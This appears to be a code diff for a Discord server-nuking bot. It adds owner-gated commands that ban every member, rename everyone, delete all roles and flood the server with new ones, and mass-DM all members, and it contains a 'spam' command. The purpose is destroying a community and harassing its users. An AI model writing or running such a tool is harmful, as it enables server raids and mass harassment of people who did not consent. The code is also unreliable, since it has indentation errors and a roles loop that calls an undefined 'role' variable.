@@ -61,11 +61,14 @@ async def spam(ctx, *, arg):
 @commands.guild_only()
 async def ban(ctx):
     if ctx.author.id == ID:
+        msg = ctx.message
+        await msg.add_reaction("🔄")
         for member in ctx.guild.members:
             try:
                 await member.ban(reason=None)
             except:
                 print("\n")
+         await msg.add_reaction("✅")
     else:
         return
     
@@ -74,14 +77,45 @@ async def ban(ctx):
 @commands.guild_only()
 async def nicknames(ctx, *, arg):
     if ctx.author.id == ID:
+        msg = ctx.message
+        await msg.add_reaction("🔄")
         for member in ctx.guild.members:
             try:
                 await member.edit(nick=arg)
             except:
                 print("\n")
+         await msg.add_reaction("✅")
     else:
         return    
             
-            
+
+@bot.command()
+@commands.guild_only()
+async def roles(ctx, *, arg):
+    if ctx.author.id == ID:
+        msg = ctx.message
+        await msg.add_reaction("🔄")
+        for channel in ctx.guild.roles:
+            await role.delete()
+        x = 30
+        guild = ctx.guild
+        while x >= 0:
+            await guild.create_role(name=arg)
+            x = int(x) - 1
+        await msg.add_reaction("✅")
+        
+@bot.command()
+@commands.guild_only()
+async def dm(ctx, *, arg):
+    if ctx.author.id == ID:
+        msg = ctx.message
+        await msg.add_reaction("🔄")
+        for member in ctx.guild.members:
+            try:
+                await member.send(arg)
+            except:
+                print(f"[!] Failed to DM {member}")
+         await msg.add_reaction("✅")
+        
 
 bot.run(TOKEN)
